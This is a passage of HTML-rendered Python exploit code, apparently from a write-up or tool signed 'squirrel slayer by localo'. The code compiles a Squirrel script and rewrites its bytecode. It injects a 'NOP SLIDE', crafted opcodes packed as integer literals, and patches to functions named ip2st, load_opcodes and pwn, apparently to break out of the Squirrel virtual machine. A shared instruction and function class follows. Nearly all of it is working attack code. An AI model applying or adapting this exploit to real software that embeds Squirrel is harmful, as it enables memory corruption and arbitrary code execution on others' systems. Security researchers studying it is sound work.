    <span class="token keyword">return</span> fn<span class="token punctuation">.</span>instructions<span class="token punctuation">[</span><span class="token punctuation">:</span>inj_idx<span class="token punctuation">]</span><span class="token punctuation">,</span>fn<span class="token punctuation">.</span>instructions<span class="token punctuation">[</span>ej_idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fn<span class="token punctuation">.</span>instructions<span class="token punctuation">[</span>inj_idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>ej_idx<span class="token punctuation">]</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">r&quot;./squirrel/bin/sq.exe -c -o test.cnut test.nut&quot;</span><span class="token punctuation">)</span>
    
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;test.cnut&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    f <span class="token operator">=</span> dism<span class="token punctuation">.</span>SQFile<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token punctuation">)</span>

    stack_up <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token string">&quot;stack_up&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> stack_up<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>stack_up<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] patching stack_up function&quot;</span><span class="token punctuation">)</span>
        <span class="token comment">#def fn(x):</span>
        <span class="token comment">#    x.stack_size = -0xFFFFFFF</span>
        <span class="token comment">#r_apply(f.main,fn)</span>
        
        


    ip2st_fn <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token string">&quot;ip2st&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ip2st_fn<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] patching ip2st function&quot;</span><span class="token punctuation">)</span>
        before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> between <span class="token operator">=</span> split_injection<span class="token punctuation">(</span>ip2st_fn<span class="token punctuation">)</span>
        target <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">for</span> ins <span class="token keyword">in</span> before<span class="token punctuation">:</span>
            <span class="token keyword">if</span> op2name<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>op<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&quot;LOAD&quot;</span><span class="token punctuation">:</span>
                target <span class="token operator">=</span> ins<span class="token punctuation">.</span>arg0
        <span class="token keyword">if</span> target <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] target not found&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        search_offset <span class="token operator">=</span> <span class="token number">0x400</span>
        n <span class="token operator">=</span> <span class="token number">8000</span><span class="token operator">//</span>step
        ip2st_fn<span class="token punctuation">.</span>literals<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x1337414243441337</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>step
        ip2st_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        ip2st_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">&quot;cmp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        pre<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
        PUSHTRAP a0:0x00 a1:%x a2: 0x00 a3:0x00
        &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>n<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
        before<span class="token operator">+=</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>pre<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>before<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
            before<span class="token operator">=</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span><span class="token string">&quot;LINE a0: 0x00 a1:0x00 a2:0x00 a3:0x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>before
        assembly<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            NE          a0: %x a1:%x a2:%x   a3:0x00
            JZ          a0: %x a1:%x a2:0x00 a3:0x00
            &quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>search_offset<span class="token operator">+</span>x<span class="token operator">*</span>step<span class="token punctuation">,</span>target<span class="token punctuation">,</span>
                    target<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>search_offset<span class="token operator">+</span>x<span class="token operator">*</span>step<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">-</span>step<span class="token operator">-</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token punctuation">(</span>n<span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>before<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
        ip2st_fn<span class="token punctuation">.</span>instructions <span class="token operator">=</span> before<span class="token operator">+</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>assembly<span class="token punctuation">)</span><span class="token operator">+</span>after
    
    load_opcodes_fn <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token string">&quot;load_opcodes&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> load_opcodes_fn<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] patching load_opcodes&quot;</span><span class="token punctuation">)</span>
        slide <span class="token operator">=</span> step<span class="token operator">*</span><span class="token number">2</span>
        before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> between <span class="token operator">=</span> split_injection<span class="token punctuation">(</span>load_opcodes_fn<span class="token punctuation">)</span>
        <span class="token comment">#NOP SLIDE</span>
        load_opcodes_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        assembly<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>slide<span class="token punctuation">)</span><span class="token punctuation">:</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>load_opcodes_fn<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        idx <span class="token operator">=</span> slide

        hacks <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
        LOADROOT    a0: 0x00 a1: 0x00 a2:0x00 a3:0x00
        LOAD        a0: 0x01 a1: %x   a2:0x00 a3:0x00
        GET         a0: 0x02 a1: 0x00 a2:0x01 a3:0x00
        ADD         a0: %x   a1: %x   a2:0x02 a3:0x00
        MOVE        a0: 0x02 a1: 0x00 a2:0x00 a3:0x00
        SET         a0: 0xFF a1: 0x00 a2:0x01 a3:0x02
        LOADINT     a0: 0x03 a1: 0x42 a2:0x00 a3:0x00
        THROW       a0: 0x03 a1: 0x00 a2:0x00 a3:0x00
        &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>step<span class="token punctuation">,</span>idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span>idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> ins <span class="token keyword">in</span> asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>hacks<span class="token punctuation">)</span><span class="token punctuation">:</span>
            load_opcodes_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;iBBBB&quot;</span><span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">,</span> ins<span class="token punctuation">.</span>op<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg0<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg2<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&apos;little&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>load_opcodes_fn<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            idx<span class="token operator">+=</span><span class="token number">1</span>
        
        load_opcodes_fn<span class="token punctuation">.</span>instructions<span class="token operator">=</span>before<span class="token operator">+</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>assembly<span class="token punctuation">)</span><span class="token operator">+</span>after


    load_opcodes_lit_fn <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token string">&quot;load_opcodes_lit&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> load_opcodes_lit_fn<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] patching load_opcodes_lit&quot;</span><span class="token punctuation">)</span>

        slide <span class="token operator">=</span> step<span class="token operator">*</span><span class="token number">2</span>
        before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> between <span class="token operator">=</span> split_injection<span class="token punctuation">(</span>load_opcodes_lit_fn<span class="token punctuation">)</span>
        <span class="token comment">#NOP SLIDE</span>
        load_opcodes_lit_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        assembly<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>slide<span class="token punctuation">)</span><span class="token punctuation">:</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>load_opcodes_lit_fn<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        idx <span class="token operator">=</span> slide

        hacks <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
        LOADROOT    a0: 0x00 a1: 0x00 a2:0x00 a3:0x00
        LOAD        a0: 0x01 a1: %x   a2:0x00 a3:0x00
        GET         a0: 0x02 a1: 0x00 a2:0x01 a3:0x00
        ADD         a0: %x   a1: %x   a2:0x02 a3:0x00
        LOAD        a0: 0x02 a1: 0x00 a2:0x00 a3:0x00
        SET         a0: 0xFF a1: 0x00 a2:0x01 a3:0x02
        LOADINT     a0: 0x03 a1: 0x42 a2:0x00 a3:0x00
        THROW       a0: 0x03 a1: 0x00 a2:0x00 a3:0x00
        &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>step<span class="token punctuation">,</span>idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span>idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> ins <span class="token keyword">in</span> asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>hacks<span class="token punctuation">)</span><span class="token punctuation">:</span>
            load_opcodes_lit_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;iBBBB&quot;</span><span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">,</span> ins<span class="token punctuation">.</span>op<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg0<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg2<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&apos;little&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>load_opcodes_lit_fn<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            idx<span class="token operator">+=</span><span class="token number">1</span>
        
        load_opcodes_lit_fn<span class="token punctuation">.</span>instructions<span class="token operator">=</span>before<span class="token operator">+</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>assembly<span class="token punctuation">)</span><span class="token operator">+</span>after


    load_opcodes_cmp_fn <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token string">&quot;load_opcodes_cmp&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> load_opcodes_cmp_fn<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] patching load_opcodes&quot;</span><span class="token punctuation">)</span>
        slide <span class="token operator">=</span> step<span class="token operator">*</span><span class="token number">2</span>

        before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> between <span class="token operator">=</span> split_injection<span class="token punctuation">(</span>load_opcodes_cmp_fn<span class="token punctuation">)</span>
        <span class="token comment">#NOP SLIDE</span>
        load_opcodes_cmp_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        assembly<span class="token operator">=</span><span class="token string">&quot;&quot;</span>
        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>slide<span class="token punctuation">)</span><span class="token punctuation">:</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>load_opcodes_cmp_fn<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        idx <span class="token operator">=</span> slide

        hacks <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
        LOADROOT    a0: 0x00 a1: 0x00 a2:0x00 a3:0x00
        DLOAD       a0: 0x01 a1: %x   a2:0x03 a3:%x
        GET         a0: 0x02 a1: 0x00 a2:0x01 a3:0x00
        GET         a0: 0x04 a1: 0x00 a2:0x03 a3:0x00
        ADD         a0: %x   a1: %x   a2:0x02 a3:0x00
        EQ          a0: 0x02 a1: 0x00 a2:0x04 a3:0x00
        SET         a0: 0xFF a1: 0x00 a2:0x01 a3:0x02
        LOADINT     a0: 0x03 a1: 0x42 a2:0x00 a3:0x00
        THROW       a0: 0x03 a1: 0x00 a2:0x00 a3:0x00
        &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>step<span class="token punctuation">,</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>idx<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span>idx<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> ins <span class="token keyword">in</span> asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>hacks<span class="token punctuation">)</span><span class="token punctuation">:</span>
            load_opcodes_cmp_fn<span class="token punctuation">.</span>literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;iBBBB&quot;</span><span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">,</span> ins<span class="token punctuation">.</span>op<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg0<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg2<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&apos;little&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            assembly<span class="token operator">+=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>load_opcodes_cmp_fn<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            idx<span class="token operator">+=</span><span class="token number">1</span>
        
        load_opcodes_cmp_fn<span class="token punctuation">.</span>instructions<span class="token operator">=</span>before<span class="token operator">+</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span>assembly<span class="token punctuation">)</span><span class="token operator">+</span>after

    pwn_fn <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token string">&quot;pwn&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> pwn_fn<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] patching pwn&quot;</span><span class="token punctuation">)</span>
        before<span class="token punctuation">,</span> after<span class="token punctuation">,</span> between <span class="token operator">=</span> split_injection<span class="token punctuation">(</span>pwn_fn<span class="token punctuation">)</span>
        patch <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        target <span class="token operator">=</span> <span class="token boolean">None</span>
        <span class="token keyword">for</span> ins <span class="token keyword">in</span> between<span class="token punctuation">:</span>
            <span class="token keyword">if</span> op2name<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>op<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&quot;PREPCALLK&quot;</span> <span class="token keyword">and</span> pwn_fn<span class="token punctuation">.</span>literals<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">]</span><span class="token operator">==</span> <span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">&apos;seek&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                target <span class="token operator">=</span> ins<span class="token punctuation">.</span>arg0
            <span class="token keyword">if</span> op2name<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>op<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&quot;CALL&quot;</span> <span class="token keyword">and</span> target <span class="token keyword">and</span> ins<span class="token punctuation">.</span>arg1 <span class="token operator">==</span> target<span class="token punctuation">:</span>
                patch<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>asm<span class="token punctuation">.</span>parse_assembly<span class="token punctuation">(</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
                MOVE    a0: %x a1: 0x02 a2:0x00 a3: 0x00
                &quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ins<span class="token punctuation">.</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            patch<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ins<span class="token punctuation">)</span>
        pwn_fn<span class="token punctuation">.</span>instructions <span class="token operator">=</span> before<span class="token operator">+</span>patch<span class="token operator">+</span>after
        <span class="token keyword">print</span><span class="token punctuation">(</span>pwn_fn<span class="token punctuation">)</span>

    f<span class="token punctuation">.</span>main<span class="token punctuation">.</span>sourcename<span class="token operator">=</span><span class="token string">&quot;h4x&quot;</span>
    f<span class="token punctuation">.</span>main<span class="token punctuation">.</span>function_name <span class="token operator">=</span> <span class="token string">&quot;squirrel slayer by localo&quot;</span>
    s <span class="token operator">=</span> asm<span class="token punctuation">.</span>SQFile<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>assemble<span class="token punctuation">(</span>f<span class="token punctuation">.</span>main<span class="token punctuation">,</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;test.cnut&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    
</pre><p><strong>common:</strong></p>
<pre data-role="codeBlock" data-info="py" class="language-python"><span class="token keyword">from</span> sqdef <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">class</span> <span class="token class-name">SQInstruction</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> arg3<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>op <span class="token operator">=</span> op
        self<span class="token punctuation">.</span>arg0 <span class="token operator">=</span> arg0
        self<span class="token punctuation">.</span>arg1 <span class="token operator">=</span> arg1
        self<span class="token punctuation">.</span>arg2 <span class="token operator">=</span> arg2
        self<span class="token punctuation">.</span>arg3 <span class="token operator">=</span> arg3

    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>op <span class="token keyword">in</span> op2name<span class="token punctuation">:</span>
            op_name <span class="token operator">=</span> <span class="token string">&quot;%s&quot;</span> <span class="token operator">%</span> op2name<span class="token punctuation">[</span>self<span class="token punctuation">.</span>op<span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            op_name <span class="token operator">=</span> <span class="token string">&quot;UNKNOWN_%d&quot;</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>op
        <span class="token keyword">return</span> <span class="token string">&quot;%-20s a0: 0x%02x a1: %s0x%08x a2: 0x%02x a3: 0x%02x&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>op_name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>arg0<span class="token punctuation">,</span> <span class="token string">&quot;-&quot;</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>arg1 <span class="token operator">&lt;</span><span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">&quot; &quot;</span><span class="token punctuation">,</span><span class="token builtin">abs</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>arg1<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>arg2<span class="token punctuation">,</span> self<span class="token punctuation">.</span>arg3<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">SQFunction</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sourcename<span class="token operator">=</span><span class="token string">&quot;h4x&quot;</span><span class="token punctuation">,</span> function_name<span class="token operator">=</span><span class="token string">&quot;h4x&quot;</span><span class="token punctuation">,</span> literals<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parameters<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> outervalues<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> localvarinfos<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> lineinfos<span class="token operator">=</span><span class="token string">b&apos;&apos;</span><span class="token punctuation">,</span> defaultparams<span class="token operator">=</span><span class="token string">b&apos;&apos;</span><span class="token punctuation">,</span> instructions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> functions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stack_size<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>is_generator<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>var_params<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>sourcename <span class="token operator">=</span> sourcename
        self<span class="token punctuation">.</span>function_name <span class="token operator">=</span> function_name
        self<span class="token punctuation">.</span>literals <span class="token operator">=</span> literals
        self<span class="token punctuation">.</span>parameters <span class="token operator">=</span> parameters
        self<span class="token punctuation">.</span>outervalues <span class="token operator">=</span> outervalues
        self<span class="token punctuation">.</span>localvarinfos <span class="token operator">=</span> localvarinfos
        self<span class="token punctuation">.</span>lineinfos <span class="token operator">=</span> lineinfos
        self<span class="token punctuation">.</span>defaultparams <span class="token operator">=</span> defaultparams
        self<span class="token punctuation">.</span>instructions <span class="token operator">=</span> instructions
        self<span class="token punctuation">.</span>functions <span class="token operator">=</span> functions
        self<span class="token punctuation">.</span>stack_size <span class="token operator">=</span> stack_size
        self<span class="token punctuation">.</span>is_generator<span class="token operator">=</span> is_generator
